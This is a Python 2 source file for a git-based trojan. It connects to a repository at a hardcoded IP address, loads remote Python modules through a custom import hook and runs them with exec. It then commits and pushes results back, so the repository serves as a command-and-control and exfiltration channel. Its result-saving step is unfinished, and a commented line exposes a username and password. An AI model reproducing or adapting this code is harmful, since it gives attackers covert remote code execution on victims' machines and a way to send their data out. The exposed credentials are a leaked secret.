import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from gittle import Gittle

repo_path = '/tmp/gittle_bare'
#repo_url = 'ssh://115.159.57.117:29418/Trojan'
repo_url = "http://115.159.57.117:8081/Trojan"
trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path	  = "data/%s/" % trojan_id
trojan_modules = []
configured		= False
task_queue		= Queue.Queue()
repo			= None

class Gitimporter(object):
	def __init__(self):
		self.current_module_code = ""

	def find_module(self, fullname, path = None):
		if configured:
			print "[*] Attempting to retrieve %s" % fullname
			new_library = get_file_contents("%s.py" % fullname)

			if new_library is not None:
				self.current_module_code = new_library
				return self

		return None
	
	def load_module(self, name):
		module = imp.new_module(name)
		exec self.current_module_code in module.__dict__
		sys.modules[name] = module

		return module
		
def connect_to_server():

#	Gittle.init(path)
	global repo

	repo = Gittle(repo_path, origin_uri = repo_url)


	#Authentication with RSA private key
	#key_file = open('/home/tuhaibo/.ssh/id_rsa')
	#key = key_file.readlines()

	#repo.auth(pkey = key_file)

	#repo = Gittle.clone(repo_url, repo_path, auth = auth)
	repo.pull()

	return repo

def get_file_contents(filepath):
#repo = connect_to_server()

#	repo.pull()
	
	print "[*] filepath %s.\n" %filepath
	filename = os.path.basename(filepath)

	for root, dirs, files in os.walk(repo_path):
		if filename in files:
			full_path = os.path.join(root, filepath)

			f = open(full_path)

			contents = f.readlines()
			contents = ''.join(contents).strip('\n')

			return contents 

	return None

def get_trojan_config():
	global configured

	config_json = get_file_contents(trojan_config)
	config		= json.loads(config_json)
	configured	= True

	for task in config:
		if task['module'] not in sys.modules:
			exec("import %s" % task['module'])

	return config	

def store_module_result(data):
#	repo = connect_to_server()

	remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))

	repo.stage()

	repo.commit(name = "ratel", email = "ratel@friedco.de", message = "new \
		   	data commit")

#repo.auth(username = "Dennis", password = "apple@511126")

	repo.push()

	return

def module_runner(module):
	task_queue.put(1)
	result = sys.modules[module].run()
#	task_queue.get()

	store_module_result(result)

	return

sys.meta_path = [Gitimporter()]
connect_to_server();

while True:
	if task_queue.empty():
		config = get_trojan_config()

		for task in config:
			t = threading.Thread(target = module_runner, args =
					(task['module'],))
			t.start()
			break
#			time.sleep(random.randint(1, 10))

	sys.exit(0)

#	time.sleep(random.randint(1000, 1000))

